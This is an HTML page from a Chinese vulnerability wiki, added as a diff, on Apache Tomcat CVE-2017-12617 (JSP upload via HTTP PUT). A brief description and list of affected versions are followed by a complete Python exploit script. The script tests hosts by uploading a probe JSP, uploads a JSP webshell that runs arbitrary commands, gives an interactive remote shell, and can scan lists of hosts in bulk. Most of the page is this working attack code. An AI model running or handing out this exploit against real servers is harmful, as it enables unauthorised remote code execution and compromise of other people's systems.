@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Apache%20Tomcat%20RCE%20via%20JSP%20Upload%20Bypass/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache Tomcat RCE via JSP Upload Bypass CVE-2017-12617 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache Tomcat RCE via JSP Upload Bypass CVE-2017-12617", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u6f0f\u6d1eEXP", url: "#exp" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/" class="btn btn-xs btn-link">
+        Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Apache%20Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Apache%20Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/" class="btn btn-xs btn-link">
+        Apache Tomcat PUT方法任意写文件漏洞 CVE-2017-12615
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-tomcat-rce-via-jsp-upload-bypass-cve-2017-12617">Apache Tomcat RCE via JSP Upload Bypass CVE-2017-12617<a class="headerlink" href="#apache-tomcat-rce-via-jsp-upload-bypass-cve-2017-12617" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Apache Tomcat版本9.0.0.M1至9.0.0、8.5.0至8.5.22、8.0.0.RC1至8.0.46和7.0.0至7.0.81且启用HTTP PUT时（例如，通过设置只读如果将Default servlet的初始化参数设置为false，则可以通过特制请求将JSP文件上载到服务器。然后可以请求此JSP，并且服务器将执行其中包含的所有代码。</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>Apache Tomcat版本9.0.0.M1至9.0.0
+Apache Tomcat版本8.5.0至8.5.22
+Apache Tomcat版本8.0.0.RC1至8.0.46
+Apache Tomcat版本7.0.0至7.0.81
+</code></pre></div>
+<h2 id="exp">漏洞EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
+<span class="c1"># From https://github.com/cyberheartmi9/CVE-2017-12617/blob/master/tomcat-cve-2017-12617.py</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">./cve-2017-12617.py [options]</span>
+
+
+<span class="sd">options:</span>
+
+
+<span class="sd">-u ,--url [::] check target url if it&#39;s vulnerable</span>
+<span class="sd">-p,--pwn [::] generate webshell and upload it</span>
+<span class="sd">-l,--list [::] hosts list</span>
+
+
+<span class="sd">[+]usage:</span>
+
+
+<span class="sd">./cve-2017-12617.py -u http://127.0.0.1</span>
+<span class="sd">./cve-2017-12617.py --url http://127.0.0.1</span>
+<span class="sd">./cve-2017-12617.py -u http://127.0.0.1 -p pwn</span>
+<span class="sd">./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn</span>
+<span class="sd">./cve-2017-12617.py -l hotsts.txt</span>
+<span class="sd">./cve-2017-12617.py --list hosts.txt</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">__future__</span><span class="w"> </span><span class="kn">import</span> <span class="n">print_function</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">builtins</span><span class="w"> </span><span class="kn">import</span> <span class="nb">input</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">builtins</span><span class="w"> </span><span class="kn">import</span> <span class="nb">str</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">builtins</span><span class="w"> </span><span class="kn">import</span> <span class="nb">object</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">signal</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">optparse</span><span class="w"> </span><span class="kn">import</span> <span class="n">OptionParser</span>
+
+
+
+
+
+
+
+
+<span class="k">class</span><span class="w"> </span><span class="nc">bcolors</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="n">HEADER</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[95m&#39;</span>
+    <span class="n">OKBLUE</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[94m&#39;</span>
+    <span class="n">OKGREEN</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[92m&#39;</span>
+    <span class="n">WARNING</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[93m&#39;</span>
+    <span class="n">FAIL</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[91m&#39;</span>
+    <span class="n">ENDC</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[0m&#39;</span>
+    <span class="n">BOLD</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1m&#39;</span>
+    <span class="n">UNDERLINE</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[4m&#39;</span>
+
+
+
+
+<span class="n">banner</span><span class="o">=</span><span class="s2">&quot;&quot;&quot;</span>
+
+
+<span class="s2">   _______      ________    ___   ___  __ ______     __ ___   __ __ ______</span>
+<span class="s2">  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |</span>
+<span class="s2"> | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /</span>
+<span class="s2"> | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / &#39;_ \| |  / /</span>
+<span class="s2"> | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /</span>
+<span class="s2">  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/</span>
+
+
+
+<span class="s2">[@intx0x80]</span>
+
+<span class="s2">&quot;&quot;&quot;</span>
+
+
+
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">signal_handler</span><span class="p">(</span><span class="n">signal</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[91m&quot;</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[-] Exiting&quot;</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+
+    <span class="n">exit</span><span class="p">()</span>
+
+<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
+
+
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">removetags</span><span class="p">(</span><span class="n">tags</span><span class="p">):</span>
+    <span class="n">remove</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s1">&#39;&lt;.*?&gt;&#39;</span><span class="p">)</span>
+    <span class="n">txt</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">remove</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">tags</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">txt</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n\n\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">getContent</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">f</span><span class="p">):</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;</span><span class="p">}</span>
+    <span class="n">re</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;/&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">f</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">content</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">createPayload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">f</span><span class="p">):</span>
+    <span class="n">evil</span><span class="o">=</span><span class="s1">&#39;&lt;</span><span class="si">% o</span><span class="s1">ut.println(&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;);%&gt;&#39;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;</span><span class="p">}</span>
+    <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">evil</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">req</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">201</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;File Created ..&quot;</span><span class="p">)</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">RCE</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">f</span><span class="p">):</span>
+    <span class="n">EVIL</span><span class="o">=</span><span class="s2">&quot;&quot;&quot;&lt;FORM METHOD=GET ACTION=&#39;</span><span class="si">{}</span><span class="s2">&#39;&gt;&quot;&quot;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">    &lt;INPUT name=&#39;cmd&#39; type=text&gt;</span>
+<span class="s2">    &lt;INPUT type=submit value=&#39;Run&#39;&gt;</span>
+<span class="s2">    &lt;/FORM&gt;</span>
+<span class="s2">    &lt;%@ page import=&quot;java.io.*&quot; %&gt;</span>
+<span class="s2">    &lt;%</span>
+<span class="s2">   String cmd = request.getParameter(&quot;cmd&quot;);</span>
+<span class="s2">   String output = &quot;&quot;;</span>
+<span class="s2">   if(cmd != null) {</span>
+<span class="s2">      String s = null;</span>
+<span class="s2">      try {</span>
+<span class="s2">         Process p = Runtime.getRuntime().exec(cmd,null,null);</span>
+<span class="s2">         BufferedReader sI = new BufferedReader(new</span>
+<span class="s2">InputStreamReader(p.getInputStream()));</span>
+<span class="s2">         while((s = sI.readLine()) != null) { output += s+&quot;&lt;/br&gt;&quot;; }</span>
+<span class="s2">      }  catch(IOException e) {   e.printStackTrace();   }</span>
+<span class="s2">   }</span>
+<span class="s2">%&gt;</span>
+<span class="s2">&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;&quot;&quot;&quot;</span>
+
+
+
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;</span><span class="p">}</span>
+
+    <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">+</span><span class="n">f</span><span class="o">+</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">EVIL</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">shell</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">f</span><span class="p">):</span>
+
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;</span><span class="p">}</span>
+        <span class="n">cmd</span><span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;$ &quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;cmd&#39;</span><span class="p">:</span><span class="n">cmd</span><span class="p">}</span>
+        <span class="k">if</span> <span class="n">cmd</span><span class="o">==</span><span class="s2">&quot;q&quot;</span> <span class="ow">or</span> <span class="n">cmd</span><span class="o">==</span><span class="s2">&quot;Q&quot;</span><span class="p">:</span>
+            <span class="k">break</span>
+
+        <span class="n">re</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;/&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">f</span><span class="p">),</span><span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+        <span class="n">re</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+        <span class="n">t</span><span class="o">=</span><span class="n">removetags</span><span class="p">(</span><span class="n">re</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+
+
+
+
+
+<span class="c1">#print bcolors.HEADER+ banner+bcolors.ENDC</span>
+
+<span class="n">parse</span><span class="o">=</span><span class="n">OptionParser</span><span class="p">(</span>
+
+
+<span class="n">bcolors</span><span class="o">.</span><span class="n">HEADER</span><span class="o">+</span><span class="s2">&quot;&quot;&quot;</span>
+
+
+<span class="s2">   _______      ________    ___   ___  __ ______     __ ___   __ __ ______</span>
+<span class="s2">  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |</span>
+<span class="s2"> | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /</span>
+<span class="s2"> | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / &#39;_ \| |  / /</span>
+<span class="s2"> | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /</span>
+<span class="s2">  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/</span>
+
+
+
+
+<span class="s2">./cve-2017-12617.py [options]</span>
+
+<span class="s2">options:</span>
+
+<span class="s2">-u ,--url [::] check target url if it&#39;s vulnerable</span>
+<span class="s2">-p,--pwn  [::] generate webshell and upload it</span>
+<span class="s2">-l,--list [::] hosts list</span>
+
+<span class="s2">[+]usage:</span>
+
+<span class="s2">./cve-2017-12617.py -u http://127.0.0.1</span>
+<span class="s2">./cve-2017-12617.py --url http://127.0.0.1</span>
+<span class="s2">./cve-2017-12617.py -u http://127.0.0.1 -p pwn</span>
+<span class="s2">./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn</span>
+<span class="s2">./cve-2017-12617.py -l hotsts.txt</span>
+<span class="s2">./cve-2017-12617.py --list hosts.txt</span>
+
+
+<span class="s2">[@intx0x80]</span>
+
+<span class="s2">&quot;&quot;&quot;</span><span class="o">+</span><span class="n">bcolors</span><span class="o">.</span><span class="n">ENDC</span>
+
+    <span class="p">)</span>
+
+
+<span class="n">parse</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s2">&quot;-u&quot;</span><span class="p">,</span><span class="s2">&quot;--url&quot;</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="s2">&quot;U&quot;</span><span class="p">,</span><span class="nb">type</span><span class="o">=</span><span class="s2">&quot;string&quot;</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="s2">&quot;Website Url&quot;</span><span class="p">)</span>
+<span class="n">parse</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s2">&quot;-p&quot;</span><span class="p">,</span><span class="s2">&quot;--pwn&quot;</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="s2">&quot;P&quot;</span><span class="p">,</span><span class="nb">type</span><span class="o">=</span><span class="s2">&quot;string&quot;</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="s2">&quot;generate webshell and upload it&quot;</span><span class="p">)</span>
+<span class="n">parse</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s2">&quot;-l&quot;</span><span class="p">,</span><span class="s2">&quot;--list&quot;</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="s2">&quot;L&quot;</span><span class="p">,</span><span class="nb">type</span><span class="o">=</span><span class="s2">&quot;string&quot;</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="s2">&quot;hosts File&quot;</span><span class="p">)</span>
+
+<span class="p">(</span><span class="n">opt</span><span class="p">,</span><span class="n">args</span><span class="p">)</span><span class="o">=</span><span class="n">parse</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">opt</span><span class="o">.</span><span class="n">U</span><span class="o">==</span><span class="kc">None</span> <span class="ow">and</span> <span class="n">opt</span><span class="o">.</span><span class="n">P</span><span class="o">==</span><span class="kc">None</span> <span class="ow">and</span> <span class="n">opt</span><span class="o">.</span><span class="n">L</span><span class="o">==</span><span class="kc">None</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">parse</span><span class="o">.</span><span class="n">usage</span><span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+
+
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">opt</span><span class="o">.</span><span class="n">U</span><span class="o">!=</span><span class="kc">None</span> <span class="ow">and</span> <span class="n">opt</span><span class="o">.</span><span class="n">P</span><span class="o">==</span><span class="kc">None</span> <span class="ow">and</span> <span class="n">opt</span><span class="o">.</span><span class="n">L</span><span class="o">==</span><span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">bcolors</span><span class="o">.</span><span class="n">OKGREEN</span><span class="o">+</span><span class="n">banner</span><span class="o">+</span><span class="n">bcolors</span><span class="o">.</span><span class="n">ENDC</span><span class="p">)</span>
+        <span class="n">url</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">opt</span><span class="o">.</span><span class="n">U</span><span class="p">)</span>
+        <span class="n">checker</span><span class="o">=</span><span class="s2">&quot;Poc.jsp&quot;</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">bcolors</span><span class="o">.</span><span class="n">BOLD</span> <span class="o">+</span><span class="s2">&quot;Poc Filename  </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">checker</span><span class="p">))</span>
+        <span class="n">createPayload</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="n">checker</span><span class="p">)</span>
+        <span class="n">con</span><span class="o">=</span><span class="n">getContent</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="n">checker</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="ow">in</span> <span class="n">con</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">bcolors</span><span class="o">.</span><span class="n">WARNING</span><span class="o">+</span><span class="n">url</span><span class="o">+</span><span class="s1">&#39; it</span><span class="se">\&#39;</span><span class="s1">s Vulnerable to CVE-2017-12617&#39;</span><span class="o">+</span><span class="n">bcolors</span><span class="o">.</span><span class="n">ENDC</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">bcolors</span><span class="o">.</span><span class="n">WARNING</span><span class="o">+</span><span class="n">url</span><span class="o">+</span><span class="s2">&quot;/&quot;</span><span class="o">+</span><span class="n">checker</span><span class="o">+</span><span class="n">bcolors</span><span class="o">.</span><span class="n">ENDC</span><span class="p">)</span>
+
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Not Vulnerable to CVE-2017-12617 &#39;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">opt</span><span class="o">.</span><span class="n">P</span><span class="o">!=</span><span class="kc">None</span> <span class="ow">and</span> <span class="n">opt</span><span class="o">.</span><span class="n">U</span><span class="o">!=</span><span class="kc">None</span> <span class="ow">and</span>  <span class="n">opt</span><span class="o">.</span><span class="n">L</span><span class="o">==</span><span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">bcolors</span><span class="o">.</span><span class="n">OKGREEN</span><span class="o">+</span><span class="n">banner</span><span class="o">+</span><span class="n">bcolors</span><span class="o">.</span><span class="n">ENDC</span><span class="p">)</span>
+        <span class="n">pwn</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">opt</span><span class="o">.</span><span class="n">P</span><span class="p">)</span>
+        <span class="n">url</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">opt</span><span class="o">.</span><span class="n">U</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Uploading Webshell .....&quot;</span><span class="p">)</span>
+        <span class="n">pwn</span><span class="o">=</span><span class="n">pwn</span><span class="o">+</span><span class="s2">&quot;.jsp&quot;</span>
+        <span class="n">RCE</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="n">pwn</span><span class="p">)</span>
+        <span class="n">shell</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">url</span><span class="p">),</span><span class="n">pwn</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">opt</span><span class="o">.</span><span class="n">L</span><span class="o">!=</span><span class="kc">None</span> <span class="ow">and</span> <span class="n">opt</span><span class="o">.</span><span class="n">P</span><span class="o">==</span><span class="kc">None</span> <span class="ow">and</span> <span class="n">opt</span><span class="o">.</span><span class="n">U</span><span class="o">==</span><span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">bcolors</span><span class="o">.</span><span class="n">OKGREEN</span><span class="o">+</span><span class="n">banner</span><span class="o">+</span><span class="n">bcolors</span><span class="o">.</span><span class="n">ENDC</span><span class="p">)</span>
+        <span class="n">w</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">opt</span><span class="o">.</span><span class="n">L</span><span class="p">)</span>
+        <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Scaning hosts in </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">w</span><span class="p">))</span>
+        <span class="n">checker</span><span class="o">=</span><span class="s2">&quot;Poc.jsp&quot;</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+            <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="n">createPayload</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="n">checker</span><span class="p">)</span>
+            <span class="n">con</span><span class="o">=</span><span class="n">getContent</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="n">checker</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="ow">in</span> <span class="n">con</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[91m&quot;</span><span class="o">+</span><span class="s2">&quot; [ Vulnerable ] &quot;&quot;</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/" class="btn btn-xs btn-link">
+        Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Apache%20Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
